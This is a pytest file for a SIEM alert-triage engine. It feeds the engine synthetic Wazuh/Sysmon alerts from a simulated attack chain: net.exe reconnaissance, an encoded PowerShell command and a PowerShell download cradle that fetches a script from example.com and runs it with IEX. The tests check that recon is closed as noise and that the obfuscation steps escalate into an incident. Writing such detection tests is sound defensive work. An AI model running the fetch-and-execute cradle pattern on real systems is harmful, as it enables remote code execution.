"""A recon-and-obfuscation chain on one endpoint: caught, with the noise closed.

    python -m pytest -q tests/test_demo_chain.py

This mirrors an adversary-simulation run on a laptop: read-only discovery
(net.exe) that a SIEM rates low, and two obfuscation steps (an encoded
PowerShell command and a download cradle) whose payloads are harmless but
whose shape is what matters. The engine must close the discovery as noise and
escalate the two obfuscation steps on the command line alone, whatever rule
level Wazuh gave them, then group them into one incident on the host.

It also pins a connector gap found while building the demo: PowerShell
script-block logging records the code in scriptBlockText, not commandLine, so
a cradle logged that way would be invisible if only commandLine were read.
"""
import base64
import datetime as dt

from app.connectors import wazuh
from app.connectors.sources import normalize
from app.engine import signals
from app.orchestrator import process_batch

CLIENT = "Greenvale Co-operative Bank"
HOST = "LAPTOP-R2T63QI9"
T0 = dt.datetime(2026, 11, 24, 11, 0, 0)


def _sysmon(sec, rid, level, desc, eventdata, groups=("sysmon", "sysmon_eid1_detections", "windows")):
    t = T0 + dt.timedelta(seconds=sec)
    return {"source": "wazuh", "client": CLIENT, "raw": {
        "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"), "id": f"{int(t.timestamp())}.{rid}{sec}",
        "rule": {"id": rid, "level": level, "description": desc, "groups": list(groups)},
        "agent": {"id": "001", "name": HOST, "ip": "192.168.1.7"}, "manager": {"name": "wazuh-demo"},
        "decoder": {"name": "windows_eventchannel"}, "location": "EventChannel",
        "data": {"win": {"system": {"eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational",
                                     "computer": HOST}, "eventdata": eventdata}}}}


def discovery(sec, cmd):
    return _sysmon(sec, "92031", 3, "Discovery activity executed",
                   {"commandLine": cmd, "image": "C:\\Windows\\System32\\net.exe",
                    "originalFileName": "net.EXE", "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "user": f"{HOST}\\akash"})


def encoded_ps(sec):
    payload = base64.b64encode("Get-Date".encode("utf-16-le")).decode()
    return _sysmon(sec, "92057", 12, "Powershell executed a base64 encoded command",
                   {"commandLine": f"powershell.exe -EncodedCommand {payload}",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "originalFileName": "PowerShell.EXE", "user": f"{HOST}\\akash"})


def cradle_scriptblock(sec):
    """A download cradle as PowerShell SCRIPT-BLOCK logging records it: the code
    is in scriptBlockText, and there is no commandLine."""
    return _sysmon(sec, "91837", 4, 'Powershell executed "Invoke-Expresion". Possible string execution as code',
                   {"scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://example.com/x')",
                    "user": f"{HOST}\\akash"}, groups=("windows", "powershell"))


def test_scriptblock_text_is_read_as_the_command_line():
    a = normalize("wazuh", cradle_scriptblock(0)["raw"], CLIENT)
    assert "downloadstring" in (a.indicators.get("cmdline") or "").lower()
    assert "PowerShell download cradle" in signals.matched_behaviours(a)


def test_the_chain_is_caught_and_the_recon_is_closed():
    chain = [discovery(0, "net  user"), discovery(20, 'net  group "domain admins" /domain'),
             discovery(40, "net  localgroup administrators"), encoded_ps(90), cradle_scriptblock(120)]
    r = process_batch(chain)
    v = {a["alert_id"]: r["verdicts"][a["alert_id"]] for a in r["alerts"]}
    esc = [a for a in r["alerts"] if v[a["alert_id"]]["escalate"]]
    closed = [a for a in r["alerts"] if not v[a["alert_id"]]["escalate"]]
    assert len(esc) == 2, "the two obfuscation steps escalate"
    assert len(closed) == 3, "the three discovery alerts are closed as noise"
    assert all(v[a["alert_id"]]["closure_code"] == "BENIGN_EXPECTED" for a in closed)


def test_the_two_obfuscation_steps_group_into_one_incident():
    chain = [discovery(0, "net  user"), encoded_ps(90), cradle_scriptblock(120)]
    r = process_batch(chain)
    assert r["metrics"]["incident_count"] == 1
    inc = r["incidents"][0]
    assert inc["size"] == 2 and inc["key"] == HOST


def test_the_incident_is_reportable_and_typed():
    from app.engine import certin
    chain = [encoded_ps(90), cradle_scriptblock(120)]
    r = process_batch(chain)
    by = {a["alert_id"]: a for a in r["alerts"]}
    inc = r["incidents"][0]
    members = [{"alert": by[i], "verdict": r["verdicts"][i]} for i in inc["alert_ids"]]
    assert certin.is_reportable_candidate(members)
    types = [t["type"] for t in certin.classify(members)]
    assert any("Malicious code" in t for t in types)


def test_the_host_is_proposed_for_isolation():
    chain = [encoded_ps(90)]
    r = process_batch(chain)
    acts = [x for v in r["actions"].values() for x in v]
    assert any(x["action_type"] == "isolate_host" and x["target"] == HOST for x in acts)
